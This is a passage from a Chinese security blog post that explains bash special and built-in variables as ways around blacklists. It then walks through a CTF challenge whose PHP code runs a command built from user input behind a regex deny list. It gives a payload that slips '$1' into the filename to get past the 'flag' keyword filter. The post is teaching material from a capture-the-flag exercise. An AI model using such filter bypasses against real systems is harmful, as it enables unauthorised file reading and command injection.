+<figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div></pre></td><td class="code"><pre><div class="line"><span class="meta">#!/bin/bash</span></div><div class="line"></div><div class="line"><span class="built_in">echo</span> <span class="string">"Quoted Values: <span class="variable">$@</span>"</span></div><div class="line"><span class="built_in">echo</span> <span class="string">"Quoted Values: $*"</span></div></pre></td></tr></table></figure>
+<p>执行命令：</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line">$ ./test.sh Hello Zedd</div><div class="line">Quoted Values: Hello Zedd</div><div class="line">Quoted Values: Hello Zedd</div></pre></td></tr></table></figure>
+<p>它们不被双引号(“ “)包含时，都以”1””2” … “$n” 的形式输出所有参数。</p>
+<p>但是当它们被双引号(“ “)包含时，”∗”会将所有的参数作为一个整体，以”1 2…n”的形式输出所有参数；”@”会将各个参数分开，以”1” “2”…”n” 的形式输出所有参数。</p>
+<h3 id="内置变量绕过"><a href="#内置变量绕过" class="headerlink" title="内置变量绕过"></a>内置变量绕过</h3><p>上篇其实提到了一点<a href="https://blog.zeddyu.info/2019/01/17/%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C/#%E9%BB%91%E5%90%8D%E5%8D%95%E7%BB%95%E8%BF%87" target="_blank" rel="external">内置变量绕过</a>，但是讲的也不并不多，只是大概提了一下。这里再给一些常用的 bash 内置的环境变量</p>
+<h4 id="BASH"><a href="#BASH" class="headerlink" title="$BASH"></a>$BASH</h4><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">$ <span class="built_in">echo</span> <span class="variable">$BASH</span></div><div class="line">/usr/<span class="built_in">local</span>/bin/bash</div></pre></td></tr></table></figure>
+<p>返回 bash 二进制文件的路径</p>
+<h4 id="HOME"><a href="#HOME" class="headerlink" title="$HOME"></a>$HOME</h4><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">$ <span class="variable">$HOME</span></div><div class="line">bash: /Users/zedd: Is a directory</div></pre></td></tr></table></figure>
+<p>返回当前用户所属目录</p>
+<h4 id="PWD"><a href="#PWD" class="headerlink" title="$PWD"></a>$PWD</h4><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">$ <span class="built_in">echo</span> <span class="variable">$PWD</span></div><div class="line">/</div></pre></td></tr></table></figure>
+<p>显示当前目录</p>
+<h4 id="OLDPWD"><a href="#OLDPWD" class="headerlink" title="$OLDPWD"></a>$OLDPWD</h4><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">$ <span class="built_in">echo</span> <span class="variable">$OLDPWD</span></div><div class="line">/Users/zedd/Desktop/</div></pre></td></tr></table></figure>
+<p>返回上次所在目录</p>
+<h4 id="PATH"><a href="#PATH" class="headerlink" title="$PATH"></a>$PATH</h4><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">$ <span class="built_in">echo</span> <span class="variable">$PATH</span></div><div class="line">/bin:/usr/bin:/usr/<span class="built_in">local</span>/bin:/usr/X11R6/bin:/sbin:/usr/sbin</div></pre></td></tr></table></figure>
+<p>环境变量<code>$PATH</code></p>
+<h4 id="PS1"><a href="#PS1" class="headerlink" title="$PS1"></a>$PS1</h4><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">$ <span class="built_in">echo</span> <span class="variable">$PS1</span></div><div class="line">\s-\v\$</div></pre></td></tr></table></figure>
+<p>看到的命令行主要提示</p>
+<h4 id="PS2"><a href="#PS2" class="headerlink" title="$PS2"></a>$PS2</h4><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">$ <span class="built_in">echo</span> <span class="variable">$PS2</span></div><div class="line">&gt;</div></pre></td></tr></table></figure>
+<p>额外输入的辅助提示，表示为<code>&gt;</code>，<code>$PS3</code>是 Shell 脚本中使用<code>select</code>时的提示符，显示为空，这里就不再单独列举了</p>
+<h4 id="PS4"><a href="#PS4" class="headerlink" title="$PS4"></a>$PS4</h4><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">$ <span class="built_in">echo</span> <span class="variable">$PS4</span></div><div class="line">+</div></pre></td></tr></table></figure>
+<p>与<code>set -x</code>配合用来修改跟踪输出的前缀，显示为<code>+</code></p>
+<h3 id="举个🌰"><a href="#举个🌰" class="headerlink" title="举个🌰"></a>举个🌰</h3><h4 id="Layer7-CTF-2018"><a href="#Layer7-CTF-2018" class="headerlink" title="Layer7 CTF 2018"></a>Layer7 CTF 2018</h4><p>可以访问<a href="https://cat.canhack.me/这个在线地址" target="_blank" rel="external">https://cat.canhack.me/这个在线地址</a></p>
+<h4 id="题目描述"><a href="#题目描述" class="headerlink" title="题目描述"></a>题目描述</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div></pre></td><td class="code"><pre><div class="line">This service provides read the file.</div><div class="line">https://cat.canhack.me/</div><div class="line"></div><div class="line">This challenge was published in the Layer7 CTF in 2018.</div></pre></td></tr></table></figure>
+<h4 id="WriteUp"><a href="#WriteUp" class="headerlink" title="WriteUp"></a>WriteUp</h4><p>点进去发现有</p>
+<figure class="highlight html"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line"><span class="tag">&lt;<span class="name">b</span>&gt;</span>Usage<span class="tag">&lt;/<span class="name">b</span>&gt;</span>: Please enter the parameter like as in <span class="tag">&lt;<span class="name">a</span> <span class="attr">href</span>=<span class="string">"/?file=test.txt"</span>&gt;</span>this<span class="tag">&lt;/<span class="name">a</span>&gt;</span>.</div></pre></td></tr></table></figure>
+<p>跟进得到<code>test.txt</code>的内容</p>
+<p><img src="https://ws1.sinaimg.cn/large/64ef14dcgy1fyumwka7dqj20yy09cmy3.jpg" alt=""></p>
+<p>猜测为文件包含，尝试直接读取<code>flag</code>被<code>waf</code>，直接读取<code>https://cat.canhack.me/?file=index.php</code></p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div></pre></td><td class="code"><pre><div class="line"><span class="meta">&lt;?php</span></div><div class="line">	error_reporting(<span class="number">0</span>);</div><div class="line"></div><div class="line">	<span class="keyword">require</span> <span class="keyword">__DIR__</span>.<span class="string">'/flag-f72a161d445915d2bdcdc820c4143353.php'</span>;</div><div class="line"></div><div class="line">	<span class="keyword">if</span>(<span class="keyword">isset</span>($_GET[<span class="string">'file'</span>]))&#123;</div><div class="line"></div><div class="line">		<span class="keyword">if</span>(preg_match(<span class="string">'/flag|\'|\"|`|\\\\|;|\(|\)|\*|\?|\.\.|\//i'</span>, $_GET[<span class="string">'file'</span>]))&#123;</div><div class="line">			<span class="keyword">die</span>(<span class="string">'no hack'</span>);</div><div class="line">		&#125;</div><div class="line"></div><div class="line">		system(<span class="string">'cat "'</span>.$_GET[<span class="string">'file'</span>].<span class="string">'"'</span>);</div><div class="line"></div><div class="line">	&#125;<span class="keyword">else</span>&#123;</div><div class="line">		<span class="keyword">echo</span> <span class="string">'&lt;b&gt;Usage&lt;/b&gt;: Please enter the parameter like as in &lt;a href="/?file=test.txt"&gt;this&lt;/a&gt;.'</span>;</div><div class="line">	&#125;</div></pre></td></tr></table></figure>
+<p>还剩下<code>{}</code>、<code>&lt;&gt;</code>、<code>[]</code>、<code>+-=</code>、<code>^</code>、<code>$</code>、<code>@</code>、<code>!</code>、<code>&amp;</code>，是个关键字绕过，有<code>$</code>，我们很快可以联想到可以用<code>$n</code>这种方式绕过，最终 payload</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">https://cat.canhack.me/?file=fl$1ag-f72a161d445915d2bdcdc820c4143353.php</div></pre></td></tr></table></figure>
+<h2 id="参考："><a href="#参考：" class="headerlink" title="参考："></a>参考：</h2><p><a href="https://www.tldp.org/LDP/abs/html/internalvariables.html" target="_blank" rel="external">Internal Variables</a></p>
+<p><a href="https://blog.csdn.net/whuslei/article/details/7187639" target="_blank" rel="external">Shell中的IFS解惑</a></p>
+<p><a href="http://wiki.jikexueyuan.com/project/shell-tutorial/shell-special-variable.html" target="_blank" rel="external">Shell 特殊变量</a></p>
+<p><a href="https://xz.aliyun.com/t/2589" target="_blank" rel="external">一个有趣的任意文件读写</a></p>
+<p><a href="https://www.freebuf.com/articles/system/176255.html" target="_blank" rel="external">利用通配符进行Linux本地提权</a></p>
+<p><a href="https://www.defensecode.com/public/DefenseCode_Unix_WildCards_Gone_Wild.txt" target="_blank" rel="external">Unix Wildcards Gone Wild</a></p>
+
+      
+    </div>
+    <footer class="article-footer">
+      <a data-url="http://asuri.org/2019/03/12/命令执行到提权/" data-id="ckhkqui3k00264soljlai11xf" class="article-share-link">Share</a>
+      
+      
+  <ul class="article-tag-list"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/RCE/">RCE</a></li></ul>
+
+    </footer>
+  </div>
+  
+    
+<nav id="article-nav">
+  
+    <a href="/2019/04/11/PHP复杂变量/" id="article-nav-newer" class="article-nav-link-wrap">
+      <strong class="article-nav-caption">Newer</strong>
+      <div class="article-nav-title">
+        
+          从一道题讲PHP复杂变量
+        
+      </div>
+    </a>
+  
+  
+    <a href="/2019/01/17/命令执行/" id="article-nav-older" class="article-nav-link-wrap">
+      <strong class="article-nav-caption">Older</strong>
+      <div class="article-nav-title">巧用命令注入的N种方式</div>
+    </a>
+  
+</nav>
+
+  
+</article>
+
+</section>
+        
+          <aside id="sidebar">
+  
+    
+  <div class="widget-wrap">
+    <h3 class="widget-title">Categories</h3>
+    <div class="widget">
+      <ul class="category-list"><li class="category-list-item"><a class="category-list-link" href="/categories/Develop/">Develop</a></li><li class="category-list-item"><a class="category-list-link" href="/categories/Devops/">Devops</a></li><li class="category-list-item"><a class="category-list-link" href="/categories/Pwn/">Pwn</a></li><li class="category-list-item"><a class="category-list-link" href="/categories/Reverse/">Reverse</a></li><li class="category-list-item"><a class="category-list-link" href="/categories/Web-安全/">Web 安全</a></li><li class="category-list-item"><a class="category-list-link" href="/categories/Writeup/">Writeup</a></li><li class="category-list-item"><a class="category-list-link" href="/categories/安卓安全/">安卓安全</a></li></ul>
+    </div>
+  </div>
+
+
+  
+    
+  <div class="widget-wrap">
+    <h3 class="widget-title">Tags</h3>
+    <div class="widget">
+      <ul class="tag-list"><li class="tag-list-item"><a class="tag-list-link" href="/tags/CVE-2015-3864/">CVE-2015-3864</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/Crypto/">Crypto</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/Docker/">Docker</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/Pwn/">Pwn</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/RCE/">RCE</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/ROP/">ROP</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/Rev/">Rev</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/Tools/">Tools</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/Windows/">Windows</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/analytics/">analytics</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/googlectf/">googlectf</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/jctf/">jctf</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/linux/">linux</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/mirai/">mirai</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/nuaactf/">nuaactf</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/phantom/">phantom</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/php/">php</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/qzone/">qzone</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/reverse/">reverse</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/suctf/">suctf</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/virus/">virus</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/windows/">windows</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/writeup/">writeup</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/xss/">xss</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/文件格式漏洞/">文件格式漏洞</a></li></ul>
+    </div>
+  </div>
+
+
+  
+    
+  <div class="widget-wrap">
+    <h3 class="widget-title">Tag Cloud</h3>
+    <div class="widget tagcloud">
+      <a href="/tags/CVE-2015-3864/" style="font-size: 10px;">CVE-2015-3864</a> <a href="/tags/Crypto/" style="font-size: 10px;">Crypto</a> <a href="/tags/Docker/" style="font-size: 10px;">Docker</a> <a href="/tags/Pwn/" style="font-size: 15px;">Pwn</a> <a href="/tags/RCE/" style="font-size: 15px;">RCE</a> <a href="/tags/ROP/" style="font-size: 10px;">ROP</a> <a href="/tags/Rev/" style="font-size: 10px;">Rev</a> <a href="/tags/Tools/" style="font-size: 15px;">Tools</a> <a href="/tags/Windows/" style="font-size: 10px;">Windows</a> <a href="/tags/analytics/" style="font-size: 10px;">analytics</a> <a href="/tags/googlectf/" style="font-size: 15px;">googlectf</a> <a href="/tags/jctf/" style="font-size: 10px;">jctf</a> <a href="/tags/linux/" style="font-size: 15px;">linux</a> <a href="/tags/mirai/" style="font-size: 10px;">mirai</a> <a href="/tags/nuaactf/" style="font-size: 15px;">nuaactf</a> <a href="/tags/phantom/" style="font-size: 10px;">phantom</a> <a href="/tags/php/" style="font-size: 10px;">php</a> <a href="/tags/qzone/" style="font-size: 10px;">qzone</a> <a href="/tags/reverse/" style="font-size: 10px;">reverse</a> <a href="/tags/suctf/" style="font-size: 10px;">suctf</a> <a href="/tags/virus/" style="font-size: 10px;">virus</a> <a href="/tags/windows/" style="font-size: 10px;">windows</a> <a href="/tags/writeup/" style="font-size: 20px;">writeup</a> <a href="/tags/xss/" style="font-size: 15px;">xss</a> <a href="/tags/文件格式漏洞/" style="font-size: 10px;">文件格式漏洞</a>
+    </div>
+  </div>
+
+  
+    
+  <div class="widget-wrap">
+    <h3 class="widget-title">Archives</h3>
+    <div class="widget">
+      <ul class="archive-list"><li class="archive-list-item"><a class="archive-list-link" href="/archives/2019/07/">July 2019</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2019/04/">April 2019</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2019/03/">March 2019</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2019/01/">January 2019</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2018/12/">December 2018</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2018/08/">August 2018</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2018/05/">May 2018</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2018/01/">January 2018</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2017/11/">November 2017</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2017/06/">June 2017</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2016/11/">November 2016</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2016/10/">October 2016</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2016/09/">September 2016</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2016/08/">August 2016</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2016/06/">June 2016</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2016/04/">April 2016</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2015/11/">November 2015</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2015/08/">August 2015</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/1970/01/">January 1970</a></li></ul>
+    </div>
+  </div>
+
+
+  
+    
+  <div class="widget-wrap">
+    <h3 class="widget-title">Recent Posts</h3>
+    <div class="widget">
+      <ul>
+        
+          <li>
+            <a href="/2019/07/30/2019-googlectf-writeup-part2/">2019-googlectf-writeup-part2</a>
+          </li>
+        
+          <li>
+            <a href="/2019/07/30/2019-googlectf-writeup-part1/">2019-googlectf-writeup-part1</a>
+          </li>
+        
+          <li>
+            <a href="/2019/04/22/Asuri_2019/">2019 第十二届全国大学生信息安全竞赛—创新实践能力赛线上赛-Asuri 2019 wp</a>
+          </li>
+        
+          <li>
+            <a href="/2019/04/11/PHP复杂变量/">从一道题讲PHP复杂变量</a>
+          </li>
+        
+          <li>
+            <a href="/2019/03/12/命令执行到提权/">命令执行到提权</a>
+          </li>
+        
+      </ul>
+    </div>
+  </div>
+
+  
+</aside>
+        
+      </div>
+      <footer id="footer">
+  
+  <div class="outer">
+    <div id="footer-info" class="inner">
+      &copy; 2020 All Members<br>
+      Powered by <a href="http://hexo.io/" target="_blank">Hexo</a>
+    </div>
+  </div>
+</footer>
+    </div>
+    <nav id="mobile-nav">
+  
+    <a href="/" class="mobile-nav-link">Home</a>
+  
+    <a href="/archives" class="mobile-nav-link">Archives</a>
+  
+</nav>
+    
+
+<script src="//ajax.googleapis.com/ajax/libs/jquery/2.0.3/jquery.min.js"></script>
+
+
+  <link rel="stylesheet" href="/fancybox/jquery.fancybox.css">
+  <script src="/fancybox/jquery.fancybox.pack.js"></script>
+
+
+<script src="/js/script.js"></script>
+
+  </div>
+</body>
+</html>
